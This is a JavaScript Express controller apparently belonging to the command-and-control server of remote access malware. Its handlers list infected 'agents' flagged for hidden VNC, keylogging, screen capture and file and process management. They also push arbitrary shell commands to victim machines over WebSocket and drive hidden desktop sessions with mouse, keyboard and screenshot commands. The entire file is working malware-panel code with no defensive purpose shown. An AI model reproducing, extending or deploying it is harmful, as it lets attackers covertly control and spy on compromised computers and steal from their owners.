const Client = require('../models/Client');
const Task = require('../models/Task');
const catchAsync = require('../utils/catchAsync');
const AppError = require('../utils/appError');

/**
 * Get all agents with filtering options
 */
exports.getAllAgents = catchAsync(async (req, res, next) => {
  const { platform, status, feature } = req.query;
  
  // Build filter object
  const filter = {};
  
  if (platform) {
    filter.operatingSystem = platform;
  }
  
  if (status === 'online') {
    // Consider clients active if heartbeat within last 5 minutes
    const fiveMinutesAgo = new Date(Date.now() - 5 * 60 * 1000);
    filter.lastHeartbeat = { $gte: fiveMinutesAgo };
  } else if (status === 'offline') {
    const fiveMinutesAgo = new Date(Date.now() - 5 * 60 * 1000);
    filter.lastHeartbeat = { $lt: fiveMinutesAgo };
  }
  
  if (feature) {
    filter['capabilities.features'] = feature;
  }
  
  const agents = await Client.find(filter).select('-authToken');
  
  // Transform data for frontend
  const transformedAgents = agents.map(agent => {
    const isOnline = new Date(agent.lastHeartbeat) > new Date(Date.now() - 5 * 60 * 1000);
    
    return {
      id: agent._id,
      name: agent.computerName,
      ip: agent.ipAddress,
      platform: agent.operatingSystem,
      status: isOnline ? 'Online' : 'Offline',
      lastSeen: agent.lastHeartbeat,
      version: agent.osVersion || 'Unknown',
      features: {
        hvnc: agent.capabilities.features.includes('hvnc'),
        keylogger: agent.capabilities.features.includes('keylogger'),
        screenCapture: agent.capabilities.features.includes('screenCapture'),
        fileManager: agent.capabilities.features.includes('fileManager'),
        processManager: agent.capabilities.features.includes('processManager')
      }
    };
  });
  
  res.status(200).json({
    status: 'success',
    results: transformedAgents.length,
    data: {
      agents: transformedAgents
    }
  });
});

/**
 * Get a single agent by ID
 */
exports.getAgent = catchAsync(async (req, res, next) => {
  const agent = await Client.findOne({ uuid: req.params.id });
  
  if (!agent) {
    return next(new AppError('No agent found with that ID', 404));
  }
  
  const isOnline = new Date(agent.lastHeartbeat) > new Date(Date.now() - 5 * 60 * 1000);
  
  const transformedAgent = {
    id: agent._id,
    name: agent.computerName,
    ip: agent.ipAddress,
    platform: agent.operatingSystem,
    status: isOnline ? 'Online' : 'Offline',
    lastSeen: agent.lastHeartbeat,
    version: agent.osVersion || 'Unknown',
    features: {
      hvnc: agent.capabilities.features.includes('hvnc'),
      keylogger: agent.capabilities.features.includes('keylogger'),
      screenCapture: agent.capabilities.features.includes('screenCapture'),
      fileManager: agent.capabilities.features.includes('fileManager'),
      processManager: agent.capabilities.features.includes('processManager')
    },
    systemInfo: agent.systemInfo || {}
  };
  
  res.status(200).json({
    status: 'success',
    data: {
      agent: transformedAgent
    }
  });
});

/**
 * Send command to agent
 */
exports.sendCommand = catchAsync(async (req, res, next) => {
  const { command, params = {} } = req.body;
  const agentId = req.params.id;
  const createdBy = req.user ? req.user.id : 'system'; // Get user ID from auth
  
  const agent = await Client.findOne({ uuid: agentId });
  
  if (!agent) {
    return next(new AppError('No agent found with that ID', 404));
  }
  
  // Generate task ID
  const taskId = `cmd_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;

  // Create task in database (always create, regardless of online status)
  const task = new Task({
    taskId: taskId,
    agentUuid: agentId,
    command: command,
    params: params,
    createdBy: createdBy,
    platform: agent.operatingSystem || 'unknown',
    queue: {
      state: 'pending',
      attempts: 0,
      priority: 0
    }
  });

  await task.save();
  console.log('Task created:', taskId);

  // Broadcast task creation to admin sessions
  const wsHandler = require('../configs/ws.handler');
  wsHandler.broadcastToAdminSessions({
    type: 'task_created',
    task: task.toObject(),
    timestamp: new Date().toISOString()
  });

  // Check if agent is online and has WebSocket connection
  const isOnline = agent.status === 'online' && new Date(agent.lastHeartbeat) > new Date(Date.now() - 2 * 60 * 1000);
  const clientConnection = wsHandler.getClientConnection(agent.uuid);

  if (isOnline && clientConnection) {
    // Agent is online - send command immediately
    try {
      // Prepare command payload
      let commandPayload = {
        type: 'command',              // ADD THIS - critical for routing
        cmd: 'execute',
        taskId: taskId,
        command: command,
        params: params,
        timestamp: new Date().toISOString()
      };

      // Platform-specific command formatting
      switch (agent.operatingSystem) {
        case 'windows':
          commandPayload.shell = 'cmd';
          break;
        case 'mac':
          commandPayload.shell = 'bash';
          break;
        case 'android':
          commandPayload.shell = 'sh';
          break;
        default:
          commandPayload.shell = 'sh';
      }

      console.log('Sending command to online client:', commandPayload);
      clientConnection.send(JSON.stringify(commandPayload));
      
      // Update task as sent
      await Task.findOneAndUpdate(
        { taskId: taskId },
        { 
          $set: { 
            'queue.state': 'sent',
            sentAt: new Date(),
            'queue.attempts': 1,
            'queue.lastAttemptAt': new Date()
          }
        }
      );

      // Broadcast task update to admin sessions
      const updatedTask = await Task.findOne({ taskId }).lean();
      wsHandler.broadcastToAdminSessions({
        type: 'task_updated',
        task: updatedTask,
        timestamp: new Date().toISOString()
      });

      console.log('Command sent successfully to client:', agent.uuid);

      res.status(200).json({
        status: 'success',
        message: `Command "${command}" sent to agent`,
        data: {
          taskId: taskId,
          agentId,
          command,
          params,
          status: 'sent'
        }
      });
    } catch (wsError) {
      console.error('Failed to send command to client:', wsError);
      // Revert task to pending state
      await Task.findOneAndUpdate(
        { taskId: taskId },
        { 
          $set: { 
            'queue.state': 'pending',
            'queue.reason': 'WebSocket send failed'
          }
        }
      );
      return next(new AppError('Failed to send command to agent', 500));
    }
  } else {
    // Agent is offline - command will be queued
    console.log('Agent is offline, command queued:', taskId);
    
    res.status(200).json({
      status: 'success',
      message: `Command "${command}" queued for agent (offline)`,
      data: {
        taskId: taskId,
        agentId,
        command,
        params,
        status: 'queued'
      }
    });
  }
});

/**
 * Start HVNC session
 */
exports.startHvncSession = catchAsync(async (req, res, next) => {
  const agentId = req.params.id;
  const { quality = 'medium', fps = 15 } = req.body;
  
  const agent = await Client.findOne({ uuid: agentId });
  
  if (!agent) {
    return next(new AppError('No agent found with that ID', 404));
  }
  
  // Check if agent is online
  const isOnline = new Date(agent.lastHeartbeat) > new Date(Date.now() - 5 * 60 * 1000);
  if (!isOnline) {
    return next(new AppError('Agent is offline and cannot start HVNC session', 400));
  }
  
  // Check if agent supports HVNC
  if (!agent.capabilities.features.includes('hvnc')) {
    return next(new AppError('Agent does not support HVNC', 400));
  }
  
  // Get WebSocket connection
  const wsHandler = require('../configs/ws.handler');
  const clientConnection = wsHandler.getClientConnection(agent.uuid);
  
  if (!clientConnection) {
    return next(new AppError('Client WebSocket connection not found', 400));
  }
  
  // Generate session ID
  const sessionId = `hvnc_${agent.uuid}_${Date.now()}`;
  
  // Send HVNC start command to client
  const hvncCommand = {
    type: 'hvnc_start',
    sessionId,
    settings: {
      quality,
      fps: parseInt(fps),
      compression: quality === 'high' ? 'low' : 'high'
    }
  };
  
  try {
    clientConnection.send(JSON.stringify(hvncCommand));
    
    // Update agent with HVNC session info
    await Client.findOneAndUpdate({ uuid: agentId }, {
      $set: {
        hvncSession: {
          sessionId,
          status: 'starting',
          quality,
          fps: parseInt(fps),
          startedAt: new Date()
        }
      }
    });
    
    res.status(200).json({
      status: 'success',
      message: 'HVNC session starting',
      data: {
        sessionId,
        agentId,
        quality,
        fps: parseInt(fps),
        status: 'starting'
      }
    });
  } catch (wsError) {
    return next(new AppError('Failed to communicate with agent', 500));
  }
});

/**
 * Stop HVNC session
 */
exports.stopHvncSession = catchAsync(async (req, res, next) => {
  const agentId = req.params.id;
  const { sessionId } = req.body;
  
  const agent = await Client.findOne({ uuid: agentId });
  
  if (!agent) {
    return next(new AppError('No agent found with that ID', 404));
  }
  
  // Get WebSocket connection
  const wsHandler = require('../configs/ws.handler');
  const clientConnection = wsHandler.getClientConnection(agent.uuid);
  
  if (clientConnection && agent.hvncSession) {
    // Send HVNC stop command to client
    const hvncCommand = {
      type: 'hvnc_stop',
      sessionId: agent.hvncSession.sessionId
    };
    
    try {
      clientConnection.send(JSON.stringify(hvncCommand));
    } catch (wsError) {
      console.error('Failed to send HVNC stop command:', wsError);
    }
  }
  
  // Clear HVNC session info
  await Client.findOneAndUpdate({ uuid: agentId }, {
    $unset: { hvncSession: 1 }
  });
  
  res.status(200).json({
    status: 'success',
    message: 'HVNC session stopped',
    data: {
      sessionId: sessionId || (agent.hvncSession && agent.hvncSession.sessionId) || Date.now().toString(),
      agentId,
      status: 'disconnected'
    }
  });
});

/**
 * Get HVNC session status
 */
exports.getHvncSessionStatus = catchAsync(async (req, res, next) => {
  const agentId = req.params.id;
  const sessionId = req.params.sessionId;
  
  const agent = await Client.findOne({ uuid: agentId });
  
  if (!agent) {
    return next(new AppError('No agent found with that ID', 404));
  }
  
  if (!agent.hvncSession || agent.hvncSession.sessionId !== sessionId) {
    return next(new AppError('HVNC session not found', 404));
  }
  
  res.status(200).json({
    status: 'success',
    data: {
      sessionId: agent.hvncSession.sessionId,
      status: agent.hvncSession.status || 'unknown',
      quality: agent.hvncSession.quality,
      fps: agent.hvncSession.fps,
      startedAt: agent.hvncSession.startedAt,
      lastUpdate: agent.hvncSession.lastUpdate,
      screenInfo: agent.hvncSession.screenInfo,
      error: agent.hvncSession.error
    }
  });
});

/**
 * Send HVNC command (mouse/keyboard input)
 */
exports.sendHvncCommand = catchAsync(async (req, res, next) => {
  const agentId = req.params.id;
  const { sessionId, command, params } = req.body;
  
  const agent = await Client.findOne({ uuid: agentId });
  
  if (!agent) {
    return next(new AppError('No agent found with that ID', 404));
  }
  
  if (!agent.hvncSession || agent.hvncSession.sessionId !== sessionId) {
    return next(new AppError('HVNC session not found', 404));
  }
  
  // Get WebSocket connection
  const wsHandler = require('../configs/ws.handler');
  const clientConnection = wsHandler.getClientConnection(agent.uuid);
  
  if (!clientConnection) {
    return next(new AppError('Client WebSocket connection not found', 400));
  }
  
  // Send HVNC command to client
  const hvncCommand = {
    type: 'hvnc_command',
    sessionId,
    command,
    params: params || {}
  };
  
  try {
    clientConnection.send(JSON.stringify(hvncCommand));
    
    res.status(200).json({
      status: 'success',
      message: 'HVNC command sent',
      data: {
        sessionId,
        command,
        params: params || {}
      }
    });
  } catch (wsError) {
    return next(new AppError('Failed to send HVNC command', 500));
  }
});

/**
 * Take HVNC screenshot
 */
exports.takeHvncScreenshot = catchAsync(async (req, res, next) => {
  const agentId = req.params.id;
  const { sessionId } = req.body;
  
  const agent = await Client.findOne({ uuid: agentId });
  
  if (!agent) {
    return next(new AppError('No agent found with that ID', 404));
  }
  
  if (!agent.hvncSession || agent.hvncSession.sessionId !== sessionId) {
    return next(new AppError('HVNC session not found', 404));
  }
  
  // Get WebSocket connection
  const wsHandler = require('../configs/ws.handler');
  const clientConnection = wsHandler.getClientConnection(agent.uuid);
  
  if (!clientConnection) {
    return next(new AppError('Client WebSocket connection not found', 400));
  }
  
  // Send screenshot request to client
  const hvncCommand = {
    type: 'hvnc_screenshot',
    sessionId
  };
  
  try {
    clientConnection.send(JSON.stringify(hvncCommand));
    
    res.status(200).json({
      status: 'success',
      message: 'Screenshot request sent',
      data: {
        sessionId
      }
    });
  } catch (wsError) {
    return next(new AppError('Failed to send screenshot request', 500));
  }
});